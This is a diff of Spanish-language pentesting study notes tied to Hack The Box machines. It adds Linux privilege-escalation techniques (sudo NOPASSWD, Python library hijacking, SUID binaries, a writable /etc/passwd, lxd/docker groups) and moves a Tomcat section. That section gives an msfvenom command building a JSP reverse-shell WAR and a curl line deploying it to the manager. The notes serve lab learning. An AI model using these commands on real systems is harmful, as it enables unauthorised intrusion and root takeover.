@@ -1,4 +1,22 @@
-# WINDOWS
+---
+title: "Apuntes de Hacking ético"
+author: ["ertiti11"]
+date: "2020-07-25"
+subject: "Markdown"
+keywords: [Markdown, Example]
+subtitle: "Pentest"
+lang: "en"
+titlepage: true
+titlepage-color: "483D8B"
+titlepage-text-color: "FFFAFA"
+titlepage-rule-color: "FFFAFA"
+titlepage-rule-height: 2
+book: true
+classoption: oneside
+code-block-font-size: \scriptsize
+---
+
+# WINDOWS 
 ## INTRUSIÓN
 
 ### SMB
@@ -130,40 +148,18 @@ una vez estando uno de los dos en la máquina víctima, debemos ejecutarlo con e
 
 Esto nos reportará un zip que posteriormente cargaremos en bloodhound que anteriormente habiamos iniciado.
 
-![](Pasted%20image%2020220426213215.png)
+![](./images/sharphound.png)
 
 Una vez cargado el archivo, nos iremos a esta parte donde nos pone *Analisys*, y aquí podemos seleccionar que es lo que queremos ver.
 
 
 
 
-# GENERAL
-
-## Tomcat
-
-
-path en un lfi para ver que usuario con que roles pueden acceder a  /manager
-**/usr/share/tomcat9/etc/tomcat-users.xml**
-
-si tenemos rol *manager-script* podemos administrar los archivos war y hacer un upload un war malicioso 
-```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
-```
-
-y para subirlo por curl:
-
-
-```bash
-curl --upload-file appplication-0.1-1.war "http://username:password@localhost:8080/manager/deploy?path=/application-0.1-1
-```
-
-
-
-
-# Linux
+# LINUX 
 ## MSFVENOM
 
 ### WAR
+
 ```bash 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
 ```
@@ -191,7 +187,6 @@ stty raw -echo; fg
 y despues :
 
 ```bash
-
 reset xterm
 ```
 
@@ -201,7 +196,24 @@ comprobaremos que las variables de SHELL=bash y TERM=xterm.
 
 ## ESCALADA DE PRIVILEGIOS
 
+### VERSION DE DISTRO
+```bash
+uname -r
+```
+
+
+### DIRTY COW
+Dirty Cow es quizá el exploit de kernel más ampliamente conocido para GNU/Linux. Apareció en el año 2016 y permitía realizar una escalada de privilegios en local. Tal fue su fama, que hasta posee página web propia:
+
+
++ https://dirtycow.ninja/
+
+
+
+
+
 ### GRUPOS
+
 ```bash
 id
 ```
@@ -214,6 +226,59 @@ el path para buscar taread cron en linux son:
 ```table
 /etc/cron.d
 ```
+
+
+Máquinas **Hack the box**:
++ Bashed 
++ Celestial 
++ Cronos 
++ Curling 
++ Europa 
++ FriendZone 
++ LaCasaDePapel
+
+### BINARIOS CON PRIVILEGIOS
+Dentro del fichero de configuración de "SUDO" existe la posibilidad de otorgar permisos de super usuario a un archivo ejecutable o binario, sin requerir para ello ningún tipo de autenticación. Para detectarlo, basta con fijarse en que exista la siguiente línea de texto: 
++  NOPASSWD:
+
+![[./images/sudo.png]]
+
+Máquinas **Hack the box**:
+
++  Academy 
++  Bashed
++  Blocky 
++  Blunder 
++  Canape 
++  FluxCapacitor 
++  Jewel 
++  Networked 
++  Nibbles 
++  OpenAdmin 
++  Shocker 
++  SneakyMailer 
++  Tenten
+
+
+### HIJACKING PYTHON LIBRARY
+
+Al detectar un “import”, el intérprete de Python realiza una búsqueda por sus directorios en busca de un módulo propio del lenguaje y, en caso de no encontrarlo, recurre a la ruta donde se ha ejecutado el propio script. Para comprobar el orden por el que Python realiza la búsqueda de un módulo en alguno de sus directorios, se debe ejecutar el siguiente comando:
+```python
+python -c 'import sys; print("\n".join(sys.path))'
+```
+
+
+
+En caso de disponer de permisos de escritura sobre alguna de las rutas y, en caso de no haber una ruta anterior que se ejecute antes que la ruta donde se puede escribir, entonces es posible suplantar al fichero original. Si el script se ha ejecutado con permisos de administrador y si ha sido posible suplantar al original, se producirá la ejecución de código con un usuario root. 
+
+A su vez, puede darse la posibilidad de detectar un módulo que no ha sido instalado pero que es requerido por un script. En estos casos, basta con crear dicho módulo tanto en el directorio del script como en las rutas de **Python**.
+
+Máquinas **Hack the box**:
++  Admirer 
++  Lazy 
++  Magic 
++  Stratosphere
+
 
 ### LEAKY PATH
 si vemos que en algún lago se esta llamando a ejecutar a algún ejecutable con la ruta corta se puede cambiar el path para que ejecute primero un ejecutable o script que tu te crees, ejemplo:
@@ -244,9 +309,82 @@ para buscarlos usaremos:
 find / -perm -4000 2>/dev/null
 ```
 
+Más tarde comprobamos en https://GTFObins.github.io
+Máquinas **Hack the box**:
+
++ Charon 
++ Bank 
++ Frolic 
++ Jarvis 
++ Lazy 
++ Magic 
++ Mango 
++ SwagShop 
++ Wall
+
+###  ARCHIVO /etc/passwd
+Para detectar si se tienen permisos de escritura de este fichero, basta con ejecutar el siguiente comando:
+
+```bash
+ls -l /etc/passwd
+```
+
+Crear una nueva contraseña en caso de poder escribir el fichero:
+```bash
+openssl passwd -1 -salt USER PASSWORD
+```
+
+Máquinas **Hack the box**:
++ Apocalyst
+
 ### GRUPOS
 si un usuario esta en el grupo (lxd) o en el grupo (docker) habria maneras de elevar nuestro privilegio.
 ```bash
 searchsploit lxd
 ```
+
+### TÉCNICAS AUTOMATIZADAS
+
++ LinEnum (**Bash**)
+
+https://github.com/rebootuser/LinEnum
+
++ LinuxPrivChecker (**Python**)
+
+https://github.com/sleventyeleven/linuxprivchecker
+
++ LinuxSmartEnumeration (**Bash**)
+
+https://github.com/diego-treitos/linux-smart-enumeration
+
++ LinPEAS(**Bash**)
+
+https://github.com/carlospolop/PEASS-ng/tere/master/linPEAS
+
+
+
+# GENERAL
+
+
+
+## Tomcat
+
+
+path en un lfi para ver que usuario con que roles pueden acceder a  /manager
+**/usr/share/tomcat9/etc/tomcat-users.xml**
+
+si tenemos rol *manager-script* podemos administrar los archivos war y hacer un upload un war malicioso 
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+```
+
+y para subirlo por curl:
+
+
+```bash
+curl --upload-file appplication-0.1-1.war "http://username:password@localhost:8080/manager/deploy?path=/application-0.1-1
+```
+
+
+
 
